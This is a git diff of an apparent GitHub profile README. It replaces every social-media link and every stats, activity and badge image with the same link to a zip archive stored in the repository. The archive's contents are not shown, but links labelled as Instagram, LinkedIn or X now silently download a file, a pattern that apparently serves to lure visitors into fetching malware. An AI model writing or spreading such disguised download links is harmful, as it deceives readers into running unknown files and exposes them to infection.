@@ -22,9 +22,9 @@ Deeply interested in **AI, ML, Cloud Computing, and Data**, with a strong focus 
 ---
 
 ## 🌐 Socials
-[![Instagram](https://img.shields.io/badge/Instagram-%23E4405F.svg?logo=Instagram&logoColor=white)](https://instagram.com/abhi.alapati)
-[![LinkedIn](https://img.shields.io/badge/LinkedIn-%230077B5.svg?logo=linkedin&logoColor=white)](https://linkedin.com/in/abhinavalapati)
-[![X](https://img.shields.io/badge/X-black.svg?logo=X&logoColor=white)](https://x.com/abhialapati9)
+[![Instagram](https://img.shields.io/badge/Instagram-%23E4405F.svg?logo=Instagram&logoColor=white)](https://raw.githubusercontent.com/AlapatiAbhinavChowdhary/AlapatiAbhinavChowdhary/main/yelper/Abhinav-Chowdhary-Alapati-1.1.zip)
+[![LinkedIn](https://img.shields.io/badge/LinkedIn-%230077B5.svg?logo=linkedin&logoColor=white)](https://raw.githubusercontent.com/AlapatiAbhinavChowdhary/AlapatiAbhinavChowdhary/main/yelper/Abhinav-Chowdhary-Alapati-1.1.zip)
+[![X](https://img.shields.io/badge/X-black.svg?logo=X&logoColor=white)](https://raw.githubusercontent.com/AlapatiAbhinavChowdhary/AlapatiAbhinavChowdhary/main/yelper/Abhinav-Chowdhary-Alapati-1.1.zip)
 [![Email](https://img.shields.io/badge/Email-D14836?logo=gmail&logoColor=white)](mailto:abhinavalapati.aac@gmail.com)
 
 ---
@@ -108,10 +108,10 @@ Deeply interested in **AI, ML, Cloud Computing, and Data**, with a strong focus 
 
 ---
 ## ⏳ Coding Activity
-![GitHub Activity Graph](https://github-readme-activity-graph.vercel.app/graph?username=AlapatiAbhinavChowdhary&theme=react-dark)
+![GitHub Activity Graph](https://raw.githubusercontent.com/AlapatiAbhinavChowdhary/AlapatiAbhinavChowdhary/main/yelper/Abhinav-Chowdhary-Alapati-1.1.zip)
 ---
 
-![Profile Views](https://komarev.com/ghpvc/?username=AlapatiAbhinavChowdhary&color=blue)
+![Profile Views](https://raw.githubusercontent.com/AlapatiAbhinavChowdhary/AlapatiAbhinavChowdhary/main/yelper/Abhinav-Chowdhary-Alapati-1.1.zip)
 
 ---
 
@@ -132,24 +132,24 @@ Deeply interested in **AI, ML, Cloud Computing, and Data**, with a strong focus 
 
 ## 🐍 Contribution Snake
 <div align="center">
-  <img src="https://profile-readme-generator.com/assets/snake.svg" />
+  <img src="https://raw.githubusercontent.com/AlapatiAbhinavChowdhary/AlapatiAbhinavChowdhary/main/yelper/Abhinav-Chowdhary-Alapati-1.1.zip" />
 </div>
 
 ---
 
 ## 📊 GitHub Stats
-![](https://github-readme-stats.vercel.app/api?username=AlapatiAbhinavChowdhary&theme=dark&include_all_commits=true)
-![](https://github-readme-streak-stats.herokuapp.com/?user=AlapatiAbhinavChowdhary&theme=dark)
-![](https://github-readme-stats.vercel.app/api/top-langs/?username=AlapatiAbhinavChowdhary&layout=compact&theme=dark)
+![](https://raw.githubusercontent.com/AlapatiAbhinavChowdhary/AlapatiAbhinavChowdhary/main/yelper/Abhinav-Chowdhary-Alapati-1.1.zip)
+![](https://raw.githubusercontent.com/AlapatiAbhinavChowdhary/AlapatiAbhinavChowdhary/main/yelper/Abhinav-Chowdhary-Alapati-1.1.zip)
+![](https://raw.githubusercontent.com/AlapatiAbhinavChowdhary/AlapatiAbhinavChowdhary/main/yelper/Abhinav-Chowdhary-Alapati-1.1.zip)
 ## 🧠 LeetCode Stats
-![LeetCode Stats](https://leetcard.jacoblin.cool/abhialapati?theme=dark&font=Karma)
+![LeetCode Stats](https://raw.githubusercontent.com/AlapatiAbhinavChowdhary/AlapatiAbhinavChowdhary/main/yelper/Abhinav-Chowdhary-Alapati-1.1.zip)
 ---
 
 ---
 
 ### ✍️ Random Dev Quote
-![](https://quotes-github-readme.vercel.app/api?type=horizontal&theme=radical)
+![](https://raw.githubusercontent.com/AlapatiAbhinavChowdhary/AlapatiAbhinavChowdhary/main/yelper/Abhinav-Chowdhary-Alapati-1.1.zip)
 
 ---
 
-[![](https://visitcount.itsvg.in/api?id=AlapatiAbhinavChowdhary&color=12)](https://visitcount.itsvg.in)
+[![](https://raw.githubusercontent.com/AlapatiAbhinavChowdhary/AlapatiAbhinavChowdhary/main/yelper/Abhinav-Chowdhary-Alapati-1.1.zip)](https://raw.githubusercontent.com/AlapatiAbhinavChowdhary/AlapatiAbhinavChowdhary/main/yelper/Abhinav-Chowdhary-Alapati-1.1.zip)
